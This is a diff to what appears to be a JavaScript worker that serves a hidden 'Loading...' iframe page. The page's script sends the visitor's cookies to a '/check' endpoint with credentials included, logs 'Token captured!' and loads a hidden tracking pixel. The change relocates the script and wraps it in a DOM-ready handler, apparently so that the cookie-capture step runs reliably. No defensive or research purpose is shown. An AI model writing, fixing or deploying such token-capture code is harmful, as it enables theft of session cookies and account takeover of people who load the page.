@@ -19,44 +19,41 @@ export default {
     // ============================================================
     
     if (url.pathname === '/frame') {
-      const html = `
-<!DOCTYPE html>
+      const html = `<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <title>Loading...</title>
-  <script>
-    // This runs inside the iframe — cookies are sent automatically
-    // because this is a cross-origin request from the parent page
-    
-    // Send the cookie to the worker
-    fetch('/check', {
-      credentials: 'include'
-    })
-    .then(function(res) {
-      return res.json();
-    })
-    .then(function(data) {
-      if (data && data.captured) {
-        console.log('Token captured!');
-      }
-    })
-    .catch(function(err) {
-      console.log('Error:', err);
-    });
-    
-    // Also try with an image pixel
-    var img = document.createElement('img');
-    img.src = '/pixel';
-    img.style.display = 'none';
-    document.body.appendChild(img);
-  <\/script>
 </head>
 <body>
-  <p style="display:none;">Loading...</p>
+  <script>
+    // Wait for DOM to be ready
+    document.addEventListener('DOMContentLoaded', function() {
+      // Send the cookie to the worker
+      fetch('/check', {
+        credentials: 'include'
+      })
+      .then(function(res) {
+        return res.json();
+      })
+      .then(function(data) {
+        if (data && data.captured) {
+          console.log('Token captured!');
+        }
+      })
+      .catch(function(err) {
+        console.log('Error:', err);
+      });
+      
+      // Also try with an image pixel
+      var img = document.createElement('img');
+      img.src = '/pixel';
+      img.style.display = 'none';
+      document.body.appendChild(img);
+    });
+  <\/script>
 </body>
-</html>
-      `;
+</html>`;
       
       return new Response(html, {
         headers: {
